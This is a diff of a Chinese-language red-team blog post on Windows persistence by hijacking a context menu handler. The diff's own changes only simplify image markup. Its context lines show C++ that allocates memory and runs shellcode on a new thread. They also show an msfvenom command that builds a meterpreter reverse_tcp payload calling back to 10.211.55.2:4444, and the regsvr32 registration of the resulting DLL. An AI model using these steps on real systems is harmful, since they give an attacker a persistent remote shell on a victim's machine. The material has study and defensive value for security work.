@@ -21,7 +21,7 @@ tags:
         ( ( void( * )() )addr )();
     }
 
-<figure class="kg-card kg-image-card kg-card-hascaption"><img src="assets/img/blog/imported/persistence-Context-Menu---VirtualAlloc.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – VirtualAlloc</figcaption></figure>
+<img src="assets/img/blog/imported/persistence-Context-Menu---VirtualAlloc.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – VirtualAlloc</figcaption>
 
 下面的代码用于接收有关用户将要选择的组件的信息，“CreateThread”将创建一个新线程来执行 shellcode。
 
@@ -40,7 +40,7 @@ tags:
             return S_OK;
     }
 
-<figure class="kg-card kg-image-card kg-card-hascaption"><img src="assets/img/blog/imported/persistence-Context-Menu---Initialize---CreateThread.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – Initialize &amp; CreateThread</figcaption></figure>
+<img src="assets/img/blog/imported/persistence-Context-Menu---Initialize---CreateThread.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – Initialize &amp; CreateThread</figcaption>
 
 “QueryInterface”方法将查询接口集合的对象。
 
@@ -59,7 +59,7 @@ tags:
         return QISearch( this, qit, riid, ppv );
     }
 
-<figure class="kg-card kg-image-card kg-card-hascaption"><img src="assets/img/blog/imported/persistence-Context-Menu---QueryInterface-1.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – QueryInterface</figcaption></figure>
+<img src="assets/img/blog/imported/persistence-Context-Menu---QueryInterface-1.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – QueryInterface</figcaption>
 
 上下文菜单处理程序将被注册为 COM 对象，因此将调用“RegisterInprocServer”函数。
 
@@ -74,17 +74,17 @@ tags:
         return hr;
     }
 
-<figure class="kg-card kg-image-card kg-card-hascaption"><img src="assets/img/blog/imported/persistence-Context-Menu---RegisterInprocServer.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – RegisterInprocServer</figcaption></figure>
+<img src="assets/img/blog/imported/persistence-Context-Menu---RegisterInprocServer.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – RegisterInprocServer</figcaption>
 
 使用 Metasploit 框架的“msfvenom”生成 shellcode 并写入文本文件中。
 
 `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=4444 EXITFUNC=thread -f c > shellcode.txt`
 
-<figure class="kg-card kg-image-card"><img src="assets/img/blog/imported/persistence-Context-Menu-msfvenom-shellcode.png" class="kg-image" alt loading="lazy"></figure>
+<img src="assets/img/blog/imported/persistence-Context-Menu-msfvenom-shellcode.png" class="kg-image" alt loading="lazy">
 
 将 shellcode 放到代码中，代码编译完成，将生成一个 DLL。使用程序“regsvr32”将 DLL 注册到操作系统中。
 
-<figure class="kg-card kg-image-card kg-card-hascaption"><img src="assets/img/blog/imported/persistence-Context-Menu---DLL-Register-Server.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – DLL Register Server</figcaption></figure>
+<img src="assets/img/blog/imported/persistence-Context-Menu---DLL-Register-Server.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – DLL Register Server</figcaption>
 
 `regsvr32 ContextMenuHijack.dll`
 
